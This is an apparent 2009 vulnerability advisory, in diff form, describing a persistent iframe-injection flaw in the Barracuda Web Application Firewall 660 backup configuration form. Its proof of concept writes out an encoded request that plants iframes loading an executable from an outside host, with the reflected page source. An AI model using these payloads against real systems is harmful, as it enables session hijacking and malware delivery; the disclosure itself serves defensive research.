@@ -1,0 +1,145 @@
+
+Pentest Information:
+====================
+GESEC Team (~remove) discover a input validation vulnerability on Barracuda - Web Application Firewall 660 (Appliance).
+A remote attacker is able to get sensitive customer sessions (hijack)or can implement script routines & malicious codes(server-side|persistent).
+
+
+Details:
+========
+Tested on OS:        		Windows 7 
+Tested with Software:    	Mozilla Firefox (SEC|MOD) & Web-Developer Suite
+
+Vulnerable Products:    	Barracuda - Web Application Firewall 660 (Appliance)
+Affected Versions:   	 	Firmware v7.3.2.015 (2009-12-04 01:20:36) Model 660
+Vulnerability Type:    		Input Vaildation Vulnerability (server-side|persistent)
+Security-Risk:         		Medium
+
+Basement Category:		Application|Hardware
+
+Vendor-URL:         		http://barracuda.com/
+Product-URL:        		http://www.barracudanetworks.com/ns/products/archiver-overview.php
+Demo-URL:			http://server/cgi-mod/index.cgi
+
+Vendor-Status:       		Not Informed
+Patch/Fix-Status:    		No Fix/Patch
+Advisory-Status:    		Published | 19.12.2009			
+
+UNPUBLIC Advisory-URL:		http://global-evolution.info/01xGE/Archive/12.2009/BC%20Web%20Firewall%20660%20v7.3.1.007%20-%20Input%20Validation%20Vulnerability/19.12.2009_BC%20Web%20Firewall%20660%20v7.3.1.007%20-%20Input%20Validation%20Vulnerability.txt	
+  PUBLIC Advisory-URL:		*
+
+GE DB-ID:			818
+CVE-ID:				()
+OSVDB-ID:			()
+
+
+Introduction:
+=============
+The Barracuda Web Application Firewall is a complete and powerful security solution for Web applications and Web sites. 
+The Barracuda Web Application Firewall provides award-winning protection against hackers leveraging protocol or 
+application vulnerabilities to instigate data theft, denial of service or defacement of your Web site.
+
+    * Protection against common attacks
+    * Outbound data theft protection
+    * Web site cloaking
+    * Granular policies
+    * Secure HTTP traffic
+    * SSL Offloading
+    * SSL Acceleration
+    * Load Balancing
+
+The Barracuda Web Application Firewall protects Web applications and Web services from malicious attacks, and can also increase 
+the performance and scalability of these applications. The Barracuda Web Application Firewall offers every capability needed to 
+deliver, secure and manage enterprise Web applications from a single appliance through an intuitive, real-time user interface.
+
+    * Single point of protection for inbound and outbound traffic for all Web applications
+    * Protects Web sites and Web applications against application layer attacks
+    * Delivers best practices security right out of the box
+    * Monitors traffic and provides reports about attackers and attack attempts
+
+The Barracuda Web Application Firewall provides award-winning protection from all common attacks on Web applications, including 
+SQL injections, cross-site scripting attacks, session tampering and buffer overflows. Many applications are vulnerable to such 
+attacks because application developers do not consistently employ secure coding practices. Barracuda Web Application Firewall is 
+designed to combat all attack types that have been categorized as significant threats, including:
+
+    * Cross Site Scripting (XSS)
+    * SQL injection flaws
+    * OS command injections
+    * Site reconnaissance
+    * Session hijacking
+    * Application denial of service	
+    * Malicious probes/crawlers		   
+    * Cookie/session tampering          
+    * Path traversal
+    * Information leakage
+
+
+		(Copy from the vendors homepage: http://www.barracudanetworks.com/ns/products/web-site-firewall-overview.php)
+
+
+
+More Details:
+=============
+A IVE vulnerability is detected on Barracuda - Web Application Firewall 660 with Firmware v7.3.2.015 (2009-12-04 03:23:23am)
+Attackers can use the vulnerability script code executions & specific manipulations. When exploited by an authenticated user,
+the identified vulnerabilities can lead to Information Disclosure, Session Hijack, access to Intranet available servers.
+
+
+Server:		archiver.barracuda.com
+File:		index.cgi
+Para:		?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username= ... &&backup_password=
+
+
+Screen:		http://img10.imageshack.us/img10/4506/ive1.png
+		http://img10.imageshack.us/img10/1138/ive2.png
+
+
+
+
+Proof of Concept:
+=================
+The vulnerabilities can be exploited by potencial attackers. On our Pentests we verified the vulnerability by loading a 
+"bad-example.exe" (http://img10.imageshack.us/img10/4506/ive1.png) file out of the Barracuda - WebFirewall 660 Appliance Application. 
+Script code executions & specific manipulations are possible over that form to get access on intranet. For demonstration ...
+ 
+Vulnerable Module: [+] Backup - Automated Configuration Backups
+
+
+References(URL):
+http://wsf.barracuda.com/cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//global-evolution.info/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//global-evolution.info/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//global-evolution.info/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//global-evolution.info%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
+
+
+Site-Code Review:
+<td valign=top><table summary="Config Module" width=100% cellpadding=0 cellspacing=0 class=config_module_inner><tr id="config_module_row_1" class="config_module_tr"><td valign=top width=15>&nbsp;</td><td valign=middle width=690    ><input type="button" class="new_button" value="Close Window" onClick="window.close(); return false;"><br><iframe width='95%' src='/cgi-bin/index.cgi?backup_port=21&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A%2F%2Fglobal-evolution.info%20width%3D800%20height%3D800%3E&locale=en_US&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A%2F%2Fglobal-evolution.info%2Fetc%2Fbad-example.exe%3E&password=f232d3b35c04af128aa56e5913fd5292&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A%2F%2Fglobal-evolution.info%2Fetc%2Fbad-example.exe%3E&user=guest&backup_life=5&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A%2F%2Fglobal-evolution.info%2Fetc%2Fbad-example.exe%3E&et=1261218005&primary_tab=ADVANCED&backup_type=ftp&auth_type=Local&secondary_tab=test_backup_server&iframe=stream_backup_test&content_only=1' marginHeight='1' marginWidth='1' height='300' frameborder='1' button_text='Stop' id='frame_results' ></iframe><input type=hidden name=content_only value=1 /></td></tr></table></td>
+
+
+Complete Site-Code Review: http://nopaste.info/a6b47158b4.html
+
+
+
+Fix & Patch:
+============
+Restrict the Input fields & format the the output when try to show the connection status.
+Set clear + working exceptions in the filter or let session expire after illegal character errors. 
+Involve in the fixes the re-included stuff like the auto backup script on ftp ... 
+
+
+
+Security Risk:
+==============
+An attacker is able to include malicious script routines on server-side of the Barracuda - WebFirewall 660.
+When exploited by an authenticated user, the identified vulnerabilities can lead to Information Disclosure, Session Hijack, 
+access to Intranet available servers.The security risk is estimated as medium because of server-side.
+
+
+Author:
+=======
+The author & writer is part of "Global-Evolution" Security(GESEC). 
+GESEC Vulnerability-Research Team protects software, services, applications & informs the vendors on a secured base.
+  ________.__        ___.          .__            ___________           .__          __  .__               
+ /  _____/|  |   ____\_ |__ _____  |  |           \_   _____/__  ______ |  |  __ ___/  |_|__| ____   ____  
+/   \  ___|  |  /  _ \| __ \\__  \ |  |    ______  |    __)_\  \/ /  _ \|  | |  |  \   __\  |/  _ \ /    \ (c)
+\    \_\  \  |_(  <_> ) \_\ \/ __ \|  |__ /_____/  |        \\   (  <_> )  |_|  |  /|  | |  (  <_> )   |  \
+ \______  /____/\____/|___  (____  /____/         /_______  / \_/ \____/|____/____/ |__| |__|\____/|___|  /
+        \/                \/     \/                       \/                                            \/ 
+	
